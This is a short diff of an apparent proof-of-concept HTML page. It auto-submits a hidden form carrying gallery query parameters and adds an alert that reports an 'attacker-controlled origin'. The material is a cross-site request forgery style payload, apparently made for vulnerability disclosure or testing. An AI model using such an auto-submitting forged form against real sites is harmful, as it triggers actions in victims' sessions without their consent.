@@ -19,4 +19,7 @@
   <input name="query_atts[gallery_end]" value="close">
   <input name="query_atts[gallery_title]" value="false">
 </form>
-<script>document.getElementById('poc').submit();</script>
+<script>
+alert('Attacker-controlled origin: ' + location.origin);
+document.getElementById('poc').submit();
+</script>
